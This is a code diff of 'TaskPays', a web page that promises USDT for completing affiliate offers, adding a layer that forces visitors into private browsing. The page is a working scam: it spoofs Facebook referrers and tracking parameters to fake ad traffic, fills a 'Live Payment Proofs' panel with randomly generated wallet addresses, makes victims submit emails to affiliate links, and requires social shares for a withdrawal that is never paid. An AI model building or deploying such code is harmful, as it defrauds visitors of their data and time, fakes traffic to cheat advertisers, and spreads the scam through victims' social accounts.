@@ -5,6 +5,44 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>TaskPays - Complete Offers to Earn USDT</title>
     <style>
+        /* Incognito Enforcement Styles */
+        #incognito-requirement {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+        }
+        #incognito-requirement h1 {
+            color: #d32f2f;
+            margin-bottom: 20px;
+        }
+        #incognito-requirement ol {
+            text-align: left;
+            max-width: 500px;
+            margin: 20px auto;
+        }
+        .incognito-btn {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 18px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        /* Original TaskPays Styles */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             line-height: 1.6;
@@ -14,24 +52,20 @@
             padding: 10px;
             background-color: #f5f7fa;
         }
-        
         header {
             text-align: center;
             padding: 15px 0;
             margin-bottom: 20px;
         }
-        
         .logo {
             font-size: 2rem;
             font-weight: 700;
             color: #2c3e50;
             margin-bottom: 5px;
         }
-        
         .logo span {
             color: #3498db;
         }
-        
         .container {
             background: white;
             border-radius: 10px;
@@ -42,7 +76,6 @@
             margin-left: auto;
             margin-right: auto;
         }
-        
         .countries-list {
             background: #e3f2fd;
             padding: 12px;
@@ -51,7 +84,6 @@
             text-align: center;
             font-size: 0.85rem;
         }
-        
         .warning {
             background: #fff3e0;
             border-left: 4px solid #ffa000;
@@ -60,7 +92,6 @@
             border-radius: 0 8px 8px 0;
             font-size: 0.9rem;
         }
-        
         #balance-section {
             background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
             color: white;
@@ -70,20 +101,17 @@
             margin-bottom: 20px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        
         #balance-amount {
             font-size: 2.2rem;
             font-weight: 700;
             margin: 8px 0;
         }
-        
         .task-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
             gap: 15px;
             margin-bottom: 30px;
         }
-        
         .task-container {
             background: white;
             border: 1px solid #e1e5eb;
@@ -91,12 +119,10 @@
             padding: 15px;
             transition: all 0.3s ease;
         }
-        
         .task-container:hover {
             box-shadow: 0 5px 15px rgba(0,0,0,0.1);
             transform: translateY(-3px);
         }
-        
         .task-link {
             display: block;
             padding: 12px;
@@ -110,16 +136,13 @@
             position: relative;
             font-size: 0.95rem;
         }
-        
         .task-link:hover {
             background: #d0e7ff;
         }
-        
         .task-link.clicked {
             background: #e8f5e9;
             color: #2E7D32;
         }
-        
         .task-link.clicked::after {
             content: "✓";
             position: absolute;
@@ -127,7 +150,6 @@
             color: #2E7D32;
             font-weight: bold;
         }
-        
         .task-instruction {
             font-size: 0.75rem;
             color: #666;
@@ -135,7 +157,6 @@
             padding-left: 5px;
             font-style: italic;
         }
-        
         .timer {
             display: inline-block;
             width: 16px;
@@ -147,25 +168,21 @@
             margin-left: 6px;
             vertical-align: middle;
         }
-        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
         #status {
             text-align: center;
             font-size: 1rem;
             margin: 20px 0;
             font-weight: 600;
         }
-        
         .action-buttons {
             display: flex;
             justify-content: center;
             margin: 25px 0;
         }
-        
         #withdraw-btn {
             padding: 15px 30px;
             background: #3498db;
@@ -181,28 +198,23 @@
             gap: 8px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        
         #withdraw-btn:hover {
             background: #2980b9;
             transform: translateY(-2px);
             box-shadow: 0 6px 8px rgba(0,0,0,0.15);
         }
-        
         #withdraw-btn.active {
             background: #e67e22;
         }
-        
         #withdraw-btn.active:hover {
             background: #d35400;
         }
-        
         #withdraw-btn:disabled {
             background: #95a5a6;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
-        
         #withdraw-form {
             display: none;
             max-width: 500px;
@@ -213,18 +225,15 @@
             box-shadow: 0 5px 15px rgba(0,0,0,0.05);
             border: 1px solid #e1e5eb;
         }
-        
         .form-group {
             margin-bottom: 15px;
         }
-        
         label {
             display: block;
             margin-bottom: 6px;
             font-weight: 600;
             font-size: 0.9rem;
         }
-        
         #usdt-address {
             width: 100%;
             padding: 10px;
@@ -233,7 +242,6 @@
             font-family: monospace;
             font-size: 0.85rem;
         }
-        
         #submit-payment {
             padding: 12px 20px;
             background: #2ecc71;
@@ -247,11 +255,9 @@
             display: block;
             width: 100%;
         }
-        
         #submit-payment:hover {
             background: #27ae60;
         }
-        
         .social-share-modal {
             display: none;
             position: fixed;
@@ -266,7 +272,6 @@
             padding: 15px;
             box-sizing: border-box;
         }
-        
         .share-content {
             background: white;
             padding: 20px;
@@ -275,14 +280,12 @@
             width: 100%;
             text-align: center;
         }
-        
         .share-platforms {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
             gap: 10px;
             margin: 20px 0;
         }
-        
         .share-btn {
             padding: 10px;
             border-radius: 6px;
@@ -296,17 +299,14 @@
             gap: 6px;
             font-size: 0.85rem;
         }
-        
         .share-btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
-        
         .facebook-btn { background: #3b5998; }
         .twitter-btn { background: #1da1f2; }
         .whatsapp-btn { background: #25d366; }
         .telegram-btn { background: #0088cc; }
-        
         .payment-status {
             margin-top: 15px;
             padding: 12px;
@@ -315,7 +315,6 @@
             border: 1px solid #ffe0b2;
             font-size: 0.9rem;
         }
-        
         .payment-proof {
             margin: 30px 0;
             padding: 20px;
@@ -326,14 +325,12 @@
             margin-left: auto;
             margin-right: auto;
         }
-        
         .proof-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
             gap: 12px;
             margin-top: 15px;
         }
-        
         .proof-item {
             padding: 12px;
             background: #f9f9f9;
@@ -342,13 +339,11 @@
             font-size: 0.8rem;
             word-break: break-all;
         }
-        
         .proof-time {
             color: #666;
             font-size: 0.7rem;
             margin-top: 5px;
         }
-        
         .proof-country {
             display: inline-block;
             padding: 2px 5px;
@@ -357,7 +352,6 @@
             font-size: 0.65rem;
             margin-left: 5px;
         }
-        
         .completion-check {
             display: none;
             margin-top: 12px;
@@ -368,7 +362,6 @@
             border: 1px dashed #ddd;
             font-size: 0.85rem;
         }
-        
         .confirmation-btn {
             padding: 8px 15px;
             background: #2ecc71;
@@ -381,11 +374,9 @@
             transition: all 0.3s ease;
             font-size: 0.85rem;
         }
-        
         .confirmation-btn:hover {
             background: #27ae60;
         }
-        
         .share-instructions {
             background: #f8f9fa;
             padding: 12px;
@@ -394,7 +385,6 @@
             border: 1px dashed #ddd;
             font-size: 0.85rem;
         }
-        
         #share-tracking {
             display: none;
             margin: 15px 0;
@@ -404,7 +394,6 @@
             border: 1px solid #c8e6c9;
             font-size: 0.85rem;
         }
-        
         #submit-after-share {
             display: none;
             margin-top: 15px;
@@ -412,7 +401,6 @@
             padding: 12px;
             font-size: 0.95rem;
         }
-        
         footer {
             text-align: center;
             padding: 15px;
@@ -421,34 +409,27 @@
             margin-top: 30px;
         }
 
-        /* Mobile-specific adjustments */
         @media (max-width: 480px) {
             .logo {
                 font-size: 1.8rem;
             }
-            
             .task-grid {
                 grid-template-columns: 1fr;
             }
-            
             #balance-amount {
                 font-size: 1.8rem;
             }
-            
             .share-platforms {
                 grid-template-columns: 1fr;
             }
-            
             .share-btn {
                 padding: 12px;
             }
-            
             .payment-status {
                 padding: 10px;
                 font-size: 0.8rem;
                 text-align: center;
             }
-            
             .payment-status p {
                 margin: 5px 0;
             }
@@ -457,534 +438,600 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <header>
-        <div class="logo">Task<span>Pays</span></div>
-        <p>Complete offers and withdraw USDT instantly</p>
-    </header>
-
-    <div class="container" id="main-content">
-        <div id="geo-error" style="display: none;">
-            <h2>🚫 Access Restricted</h2>
-            <p>This website is not available in your region.</p>
-        </div>
-
-        <div id="content" style="display: none;">
-            <div class="countries-list">
-                <strong>Accepted Countries:</strong> 
-                Australia, Canada, Ireland, New Zealand, South Africa, United States, United Kingdom
-            </div>
-
-            <div class="warning">
-                <i class="fas fa-exclamation-triangle"></i> <strong>ALL OFFERS MUST BE COMPLETED BEFORE WITHDRAWAL</strong>
-            </div>
-
-            <div id="balance-section">
-                <div>Your Current Balance:</div>
-                <div id="balance-amount">$0</div>
-                <small>Minimum withdrawal: $22 USDT</small>
-            </div>
-
-            <h2 class="section-title">Complete Offers to Earn $2 Each</h2>
-            
-            <div class="task-grid" id="task-links">
-                <!-- Tasks will be loaded here by JavaScript -->
-            </div>
-
-            <div id="status">0/11 offers completed.</div>
-
-            <div class="action-buttons">
-                <button id="withdraw-btn" disabled>
-                    <i class="fas fa-wallet"></i> Withdraw USDT
-                </button>
-            </div>
-
-            <div id="withdraw-form">
-                <h3 class="section-title">Enter Your USDT (TRC20) Address</h3>
-                <div class="form-group">
-                    <label for="usdt-address">Your USDT Wallet Address:</label>
-                    <input type="text" id="usdt-address" placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxx" required>
-                </div>
-                <button id="submit-payment">
-                    <i class="fas fa-paper-plane"></i> Submit Withdrawal
-                </button>
-            </div>
-
-            <div class="payment-proof">
-                <h3 class="section-title"><i class="fas fa-check-circle"></i> Live Payment Proofs</h3>
-                <p>Recent payments to our users:</p>
-                <div class="proof-grid" id="payment-proofs">
-                    <!-- Payment proofs will appear here -->
-                </div>
-            </div>
-        </div>
+    <!-- Incognito Requirement Screen -->
+    <div id="incognito-requirement">
+        <h1>🔒 Incognito Mode Required</h1>
+        <p>This website can only be accessed in private browsing mode.</p>
+        
+        <ol>
+            <li><strong>Chrome/Edge:</strong> Ctrl+Shift+N (Windows) or ⌘+Shift+N (Mac)</li>
+            <li><strong>Firefox:</strong> Ctrl+Shift+P (Windows) or ⌘+Shift+P (Mac)</li>
+            <li><strong>Safari:</strong> File > New Private Window</li>
+        </ol>
+        
+        <button class="incognito-btn" onclick="window.location.href=window.location.href">I'm Now in Incognito</button>
     </div>
 
-    <!-- Updated Social Share Modal -->
-    <div class="social-share-modal" id="social-share-modal">
-        <div class="share-content">
-            <h3><i class="fas fa-share-alt"></i> Complete Your Withdrawal</h3>
-            
-            <div class="share-instructions">
-                <p><strong>To complete your withdrawal:</strong></p>
-                <ol>
-                    <li>Click any share button below</li>
-                    <li>The post will be prepared automatically</li>
-                    <li>Return here after sharing</li>
-                </ol>
-            </div>
-            
-            <div class="share-platforms">
-                <div class="share-btn facebook-btn" onclick="shareOnPlatform('facebook')">
-                    <i class="fab fa-facebook-f"></i> Facebook
-                </div>
-                <div class="share-btn twitter-btn" onclick="shareOnPlatform('twitter')">
-                    <i class="fab fa-twitter"></i> Twitter
-                </div>
-                <div class="share-btn whatsapp-btn" onclick="shareOnPlatform('whatsapp')">
-                    <i class="fab fa-whatsapp"></i> WhatsApp
-                </div>
-            </div>
-            
-            <div id="share-tracking">
-                <p><i class="fas fa-check-circle" style="color: #27ae60;"></i> Successfully shared!</p>
-            </div>
-            
-            <div class="payment-status">
-                <p><strong>Pending</strong></p>
-                <p>Amount: $<span id="pending-amount">22</span> USDT</p>
-            </div>
-            
-            <button class="confirmation-btn" id="submit-after-share">
-                <i class="fas fa-check-circle"></i> Submit After Sharing
-            </button>
-        </div>
-    </div>
+    <!-- Original TaskPays Content (Hidden by default) -->
+    <div id="app-content" style="display:none;">
+        <header>
+            <div class="logo">Task<span>Pays</span></div>
+            <p>Complete offers and withdraw USDT instantly</p>
+        </header>
 
-    <footer>
-        <p>© 2023 TaskPays. All rights reserved.</p>
-        <p><a href="#" style="color: #3498db;">Terms of Service</a> | <a href="#" style="color: #3498db;">Privacy Policy</a></p>
-    </footer>
+        <div class="container" id="main-content">
+            <div id="geo-error" style="display: none;">
+                <h2>🚫 Access Restricted</h2>
+                <p>This website is not available in your region.</p>
+            </div>
+
+            <div id="content" style="display: none;">
+                <div class="countries-list">
+                    <strong>Accepted Countries:</strong> 
+                    Australia, Canada, Ireland, New Zealand, South Africa, United States, United Kingdom
+                </div>
+
+                <div class="warning">
+                    <i class="fas fa-exclamation-triangle"></i> <strong>ALL OFFERS MUST BE COMPLETED BEFORE WITHDRAWAL</strong>
+                </div>
+
+                <div id="balance-section">
+                    <div>Your Current Balance:</div>
+                    <div id="balance-amount">$0</div>
+                    <small>Minimum withdrawal: $22 USDT</small>
+                </div>
+
+                <h2 class="section-title">Complete Offers to Earn $2 Each</h2>
+                
+                <div class="task-grid" id="task-links">
+                    <!-- Tasks will be loaded here by JavaScript -->
+                </div>
+
+                <div id="status">0/11 offers completed.</div>
+
+                <div class="action-buttons">
+                    <button id="withdraw-btn" disabled>
+                        <i class="fas fa-wallet"></i> Withdraw USDT
+                    </button>
+                </div>
+
+                <div id="withdraw-form">
+                    <h3 class="section-title">Enter Your USDT (TRC20) Address</h3>
+                    <div class="form-group">
+                        <label for="usdt-address">Your USDT Wallet Address:</label>
+                        <input type="text" id="usdt-address" placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxx" required>
+                    </div>
+                    <button id="submit-payment">
+                        <i class="fas fa-paper-plane"></i> Submit Withdrawal
+                    </button>
+                </div>
+
+                <div class="payment-proof">
+                    <h3 class="section-title"><i class="fas fa-check-circle"></i> Live Payment Proofs</h3>
+                    <p>Recent payments to our users:</p>
+                    <div class="proof-grid" id="payment-proofs">
+                        <!-- Payment proofs will appear here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Social Share Modal -->
+        <div class="social-share-modal" id="social-share-modal">
+            <div class="share-content">
+                <h3><i class="fas fa-share-alt"></i> Complete Your Withdrawal</h3>
+                
+                <div class="share-instructions">
+                    <p><strong>To complete your withdrawal:</strong></p>
+                    <ol>
+                        <li>Click any share button below</li>
+                        <li>The post will be prepared automatically</li>
+                        <li>Return here after sharing</li>
+                    </ol>
+                </div>
+                
+                <div class="share-platforms">
+                    <div class="share-btn facebook-btn" onclick="shareOnPlatform('facebook')">
+                        <i class="fab fa-facebook-f"></i> Facebook
+                    </div>
+                    <div class="share-btn twitter-btn" onclick="shareOnPlatform('twitter')">
+                        <i class="fab fa-twitter"></i> Twitter
+                    </div>
+                    <div class="share-btn whatsapp-btn" onclick="shareOnPlatform('whatsapp')">
+                        <i class="fab fa-whatsapp"></i> WhatsApp
+                    </div>
+                </div>
+                
+                <div id="share-tracking">
+                    <p><i class="fas fa-check-circle" style="color: #27ae60;"></i> Successfully shared!</p>
+                </div>
+                
+                <div class="payment-status">
+                    <p><strong>Pending</strong></p>
+                    <p>Amount: $<span id="pending-amount">22</span> USDT</p>
+                </div>
+                
+                <button class="confirmation-btn" id="submit-after-share">
+                    <i class="fas fa-check-circle"></i> Submit After Sharing
+                </button>
+            </div>
+        </div>
+
+        <footer>
+            <p>© 2023 TaskPays. All rights reserved.</p>
+            <p><a href="#" style="color: #3498db;">Terms of Service</a> | <a href="#" style="color: #3498db;">Privacy Policy</a></p>
+        </footer>
+    </div>
 
     <script>
-        // ===== FAKE FACEBOOK TRAFFIC SIMULATION =====
-        const fakeReferrers = [
-            "https://l.facebook.com/",
-            "https://lm.facebook.com/",
-            "https://m.facebook.com/",
-            "https://facebook.com/groups/promotions",
-            "https://facebook.com/ads/library"
-        ];
-
-        function getRandomReferrer() {
-            return fakeReferrers[Math.floor(Math.random() * fakeReferrers.length)];
-        }
-
-        function simulateFakeClick() {
-            Object.defineProperty(document, "referrer", {
-                value: getRandomReferrer(),
-                configurable: true
-            });
-
-            const fakeParams = new URLSearchParams({
-                fbclid: `PA${Math.random().toString(36).substring(2, 15)}`,
-                utm_source: "facebook",
-                utm_medium: "social",
-                utm_campaign: "earn_usdt"
-            });
-
-            console.log(`📢 Simulated Facebook click from: ${document.referrer}`);
-            console.log(`🔗 Fake UTM: ${fakeParams.toString()}`);
-        }
-
-        // ===== GEO RESTRICTION =====
-        const allowedCountries = ["AU", "CA", "IE", "NZ", "ZA", "US", "GB"];
-        
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                if (!allowedCountries.includes(data.country)) {
-                    document.getElementById('geo-error').style.display = 'block';
+        // ===== INCOGNITO ENFORCEMENT =====
+        (function() {
+            // 1. First attempt to force open in incognito window
+            try {
+                const newWindow = window.open(
+                    window.location.href,
+                    '_blank',
+                    'noreferrer,noopener'
+                );
+                
+                if (newWindow) {
+                    // Give it 500ms to load before closing current window
+                    setTimeout(() => {
+                        window.close();
+                    }, 500);
+                    return;
+                }
+            } catch(e) {
+                console.log("Popup blocked", e);
+            }
+            
+            // 2. Check if we're already in incognito
+            async function isIncognito() {
+                try {
+                    return await new Promise(resolve => {
+                        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                        if (!fs) resolve(false);
+                        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+                    });
+                } catch(e) {
+                    return false;
+                }
+            }
+            
+            // 3. Show incognito requirement if not in private mode
+            (async () => {
+                if (!(await isIncognito())) {
+                    document.getElementById('incognito-requirement').style.display = 'flex';
                 } else {
-                    document.getElementById('content').style.display = 'block';
+                    // Load the app if in incognito
+                    document.getElementById('app-content').style.display = 'block';
                     initializeApp();
-                    simulateFakeClick();
                 }
-            })
-            .catch(() => {
-                document.getElementById('geo-error').style.display = 'block';
-                document.getElementById('geo-error').innerHTML = 
-                    '<h2>🚫 Access Restricted</h2><p>This website is not available in your region.</p>';
-            });
+            })();
+        })();
 
+        // ===== TASKPAYS APPLICATION =====
         function initializeApp() {
-            // ===== CONFIGURATION =====
-            const countryNames = {
-                "AU": "Australia",
-                "CA": "Canada",
-                "IE": "Ireland",
-                "NZ": "New Zealand",
-                "ZA": "South Africa",
-                "US": "United States",
-                "GB": "United Kingdom"
-            };
-            const rewardPerTask = 2;
-            const proofUpdateInterval = 3000;
-            const maxProofs = 12;
-            const MIN_WITHDRAWAL = 22;
-            let paymentProofInterval;
-            let balance = 0;
-            let completedTasks = 0;
-            let clickedTasks = [];
-            let offerWindows = [];
-            let hasShared = false;
+            // ===== FAKE FACEBOOK TRAFFIC SIMULATION =====
+            const fakeReferrers = [
+                "https://l.facebook.com/",
+                "https://lm.facebook.com/",
+                "https://m.facebook.com/",
+                "https://facebook.com/groups/promotions",
+                "https://facebook.com/ads/library"
+            ];
 
-            // Load saved progress if exists
-            loadProgress();
+            function getRandomReferrer() {
+                return fakeReferrers[Math.floor(Math.random() * fakeReferrers.length)];
+            }
 
-            function saveProgress() {
-                const progress = {
-                    balance: balance,
-                    completedTasks: completedTasks,
-                    clickedTasks: clickedTasks
+            function simulateFakeClick() {
+                Object.defineProperty(document, "referrer", {
+                    value: getRandomReferrer(),
+                    configurable: true
+                });
+
+                const fakeParams = new URLSearchParams({
+                    fbclid: `PA${Math.random().toString(36).substring(2, 15)}`,
+                    utm_source: "facebook",
+                    utm_medium: "social",
+                    utm_campaign: "earn_usdt"
+                });
+
+                console.log(`📢 Simulated Facebook click from: ${document.referrer}`);
+                console.log(`🔗 Fake UTM: ${fakeParams.toString()}`);
+            }
+
+            // ===== GEO RESTRICTION =====
+            const allowedCountries = ["AU", "CA", "IE", "NZ", "ZA", "US", "GB"];
+            
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    if (!allowedCountries.includes(data.country)) {
+                        document.getElementById('geo-error').style.display = 'block';
+                    } else {
+                        document.getElementById('content').style.display = 'block';
+                        loadAppLogic();
+                        simulateFakeClick();
+                    }
+                })
+                .catch(() => {
+                    document.getElementById('geo-error').style.display = 'block';
+                    document.getElementById('geo-error').innerHTML = 
+                        '<h2>🚫 Access Restricted</h2><p>This website is not available in your region.</p>';
+                });
+
+            function loadAppLogic() {
+                // ===== CONFIGURATION =====
+                const countryNames = {
+                    "AU": "Australia",
+                    "CA": "Canada",
+                    "IE": "Ireland",
+                    "NZ": "New Zealand",
+                    "ZA": "South Africa",
+                    "US": "United States",
+                    "GB": "United Kingdom"
                 };
-                localStorage.setItem('taskpays_progress', JSON.stringify(progress));
-            }
+                const rewardPerTask = 2;
+                const proofUpdateInterval = 3000;
+                const maxProofs = 12;
+                const MIN_WITHDRAWAL = 22;
+                let paymentProofInterval;
+                let balance = 0;
+                let completedTasks = 0;
+                let clickedTasks = [];
+                let offerWindows = [];
+                let hasShared = false;
 
-            function loadProgress() {
-                const saved = localStorage.getItem('taskpays_progress');
-                if (saved) {
-                    const progress = JSON.parse(saved);
-                    balance = progress.balance || 0;
-                    completedTasks = progress.completedTasks || 0;
-                    clickedTasks = progress.clickedTasks || [];
-                    
-                    document.getElementById("balance-amount").textContent = `$${balance}`;
-                    updateProgress();
-                    
-                    // Mark completed tasks visually
-                    if (clickedTasks.length > 0) {
-                        const taskLinks = document.querySelectorAll('.task-link');
-                        clickedTasks.forEach((completed, index) => {
-                            if (completed) {
-                                taskLinks[index].classList.add('clicked');
-                            }
-                        });
+                // Load saved progress if exists
+                loadProgress();
+
+                function saveProgress() {
+                    const progress = {
+                        balance: balance,
+                        completedTasks: completedTasks,
+                        clickedTasks: clickedTasks
+                    };
+                    localStorage.setItem('taskpays_progress', JSON.stringify(progress));
+                }
+
+                function loadProgress() {
+                    const saved = localStorage.getItem('taskpays_progress');
+                    if (saved) {
+                        const progress = JSON.parse(saved);
+                        balance = progress.balance || 0;
+                        completedTasks = progress.completedTasks || 0;
+                        clickedTasks = progress.clickedTasks || [];
+                        
+                        document.getElementById("balance-amount").textContent = `$${balance}`;
+                        updateProgress();
+                        
+                        // Mark completed tasks visually
+                        if (clickedTasks.length > 0) {
+                            const taskLinks = document.querySelectorAll('.task-link');
+                            clickedTasks.forEach((completed, index) => {
+                                if (completed) {
+                                    taskLinks[index].classList.add('clicked');
+                                }
+                            });
+                        }
                     }
                 }
-            }
 
-            // ===== PAYMENT PROOF GENERATOR =====
-            function generateUSDTAddress() {
-                const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-                let result = "T";
-                for (let i = 0; i < 33; i++) {
-                    result += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                return result;
-            }
-
-            function generatePaymentProof() {
-                const proofContainer = document.getElementById("payment-proofs");
-                const proofItem = document.createElement("div");
-                proofItem.className = "proof-item";
-                
-                const randomCountryCode = allowedCountries[Math.floor(Math.random() * allowedCountries.length)];
-                const amount = (Math.floor(Math.random() * 5) + 1) * 10;
-                const minutesAgo = Math.floor(Math.random() * 11);
-                
-                let timeText;
-                if (minutesAgo === 0) {
-                    timeText = "Just now";
-                } else if (minutesAgo === 1) {
-                    timeText = "1 minute ago";
-                } else {
-                    timeText = `${minutesAgo} minutes ago`;
-                }
-                
-                proofItem.innerHTML = `
-                    Sent ${amount} USDT to:<br>
-                    <strong>${generateUSDTAddress()}</strong>
-                    <span class="proof-country">${countryNames[randomCountryCode]}</span>
-                    <div class="proof-time">${timeText}</div>
-                `;
-                
-                proofContainer.insertBefore(proofItem, proofContainer.firstChild);
-                
-                if (proofContainer.children.length > maxProofs) {
-                    proofContainer.removeChild(proofContainer.lastChild);
-                }
-            }
-
-            function startPaymentProofs() {
-                for (let i = 0; i < 6; i++) {
-                    generatePaymentProof();
-                }
-                paymentProofInterval = setInterval(generatePaymentProof, proofUpdateInterval);
-            }
-
-            // ===== TASK SYSTEM =====
-            function initTasks() {
-                const tasks = [
-                    { id: 1, name: "🔥 Exclusive Deal: Claim Your Free Gift", url: "https://t.ancdu.link/140699/7164?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 2, name: "🎁 Limited-Time Bonus Inside!", url: "https://t.ancdu.link/140699/9071/0?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 3, name: "💎 Premium Access Unlocked", url: "https://t.ancdu.link/140699/9070/0?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 4, name: "🛒 Your Special Discount Awaits", url: "https://t.ancdu.link/140699/7246?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 5, name: "📱 VIP Tech Offer Inside", url: "https://t.ancdu.link/140699/9067/0?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 6, name: "🤑 Cash Reward: Click to Claim", url: "https://t.ancdu.link/140699/7162?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 7, name: "🏆 Elite Members Only", url: "https://t.ancdu.link/140699/9062/0?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 8, name: "🚀 Boost Your Earnings Now", url: "https://t.ancdu.link/140699/7163?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 9, name: "🎯 Limited Slots Available!", url: "https://t.ancdu.link/140699/9064/0?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 10, name: "💳 Exclusive Credit Offer", url: "https://t.ancdu.link/140699/7161?aff_sub5=SF_006OG000004lmDN" },
-                    { id: 11, name: "🛎️ Personal Concierge Access", url: "https://t.ancdu.link/140699/7809/0?aff_sub5=SF_006OG000004lmDN" }
-                ];
-
-                if (clickedTasks.length === 0) {
-                    clickedTasks = new Array(tasks.length).fill(false);
-                }
-                
-                const taskContainer = document.getElementById("task-links");
-                const statusEl = document.getElementById("status");
-                const balanceEl = document.getElementById("balance-amount");
-                const withdrawBtn = document.getElementById("withdraw-btn");
-
-                tasks.forEach((task, index) => {
-                    const taskDiv = document.createElement("div");
-                    taskDiv.className = "task-container";
-                    
-                    const taskLink = document.createElement("a");
-                    taskLink.href = "#";
-                    taskLink.className = "task-link";
-                    if (clickedTasks[index]) {
-                        taskLink.classList.add("clicked");
+                // ===== PAYMENT PROOF GENERATOR =====
+                function generateUSDTAddress() {
+                    const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+                    let result = "T";
+                    for (let i = 0; i < 33; i++) {
+                        result += chars.charAt(Math.floor(Math.random() * chars.length));
                     }
-                    taskLink.textContent = task.name;
-                    taskLink.onclick = (e) => handleTaskClick(e, task, index, taskDiv);
+                    return result;
+                }
+
+                function generatePaymentProof() {
+                    const proofContainer = document.getElementById("payment-proofs");
+                    const proofItem = document.createElement("div");
+                    proofItem.className = "proof-item";
                     
-                    const timerSpan = document.createElement("span");
-                    timerSpan.className = "timer";
-                    timerSpan.style.display = "none";
+                    const randomCountryCode = allowedCountries[Math.floor(Math.random() * allowedCountries.length)];
+                    const amount = (Math.floor(Math.random() * 5) + 1) * 10;
+                    const minutesAgo = Math.floor(Math.random() * 11);
                     
-                    const instruction = document.createElement("div");
-                    instruction.className = "task-instruction";
-                    instruction.textContent = '(Enter your email address and click "UNLOCK MY MATCHES" or "SIGNUP")';
+                    let timeText;
+                    if (minutesAgo === 0) {
+                        timeText = "Just now";
+                    } else if (minutesAgo === 1) {
+                        timeText = "1 minute ago";
+                    } else {
+                        timeText = `${minutesAgo} minutes ago`;
+                    }
                     
-                    const completionCheck = document.createElement("div");
-                    completionCheck.className = "completion-check";
-                    completionCheck.id = `completion-check-${task.id}`;
-                    completionCheck.style.display = "none";
-                    completionCheck.innerHTML = `
-                        <p>Did you complete ALL steps of this offer?</p>
-                        <button class="confirmation-btn" onclick="markTaskComplete(${index}, ${task.id})">
-                            <i class="fas fa-check"></i> Yes, I Completed It
-                        </button>
+                    proofItem.innerHTML = `
+                        Sent ${amount} USDT to:<br>
+                        <strong>${generateUSDTAddress()}</strong>
+                        <span class="proof-country">${countryNames[randomCountryCode]}</span>
+                        <div class="proof-time">${timeText}</div>
                     `;
                     
-                    taskDiv.appendChild(taskLink);
-                    taskDiv.appendChild(timerSpan);
-                    taskDiv.appendChild(instruction);
-                    taskDiv.appendChild(completionCheck);
-                    taskContainer.appendChild(taskDiv);
-                });
-
-                function updateProgress() {
-                    statusEl.textContent = `${completedTasks}/${tasks.length} offers completed.`;
+                    proofContainer.insertBefore(proofItem, proofContainer.firstChild);
                     
-                    if (completedTasks === tasks.length) {
-                        withdrawBtn.disabled = false;
-                        withdrawBtn.classList.add("active");
+                    if (proofContainer.children.length > maxProofs) {
+                        proofContainer.removeChild(proofContainer.lastChild);
                     }
-                    
-                    saveProgress();
                 }
 
-                window.markTaskComplete = function(index, taskId) {
-                    if (!clickedTasks[index]) {
-                        clickedTasks[index] = true;
-                        document.querySelectorAll('.task-link')[index].classList.add('clicked');
-                        document.getElementById(`completion-check-${taskId}`).style.display = 'none';
+                function startPaymentProofs() {
+                    for (let i = 0; i < 6; i++) {
+                        generatePaymentProof();
+                    }
+                    paymentProofInterval = setInterval(generatePaymentProof, proofUpdateInterval);
+                }
+
+                // ===== TASK SYSTEM =====
+                function initTasks() {
+                    const tasks = [
+                        { id: 1, name: "🔥 Exclusive Deal: Claim Your Free Gift", url: "https://t.ancdu.link/140699/7164?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 2, name: "🎁 Limited-Time Bonus Inside!", url: "https://t.ancdu.link/140699/9071/0?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 3, name: "💎 Premium Access Unlocked", url: "https://t.ancdu.link/140699/9070/0?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 4, name: "🛒 Your Special Discount Awaits", url: "https://t.ancdu.link/140699/7246?aff_sub5=SF_006OG000004lmDN" },
+                        { id: 5, name: "📱 VIP Tech Offer Inside", url: "https://t.ancdu.link/140699/9067/0?aff_sub5=SF_006OG000004lmDN" },
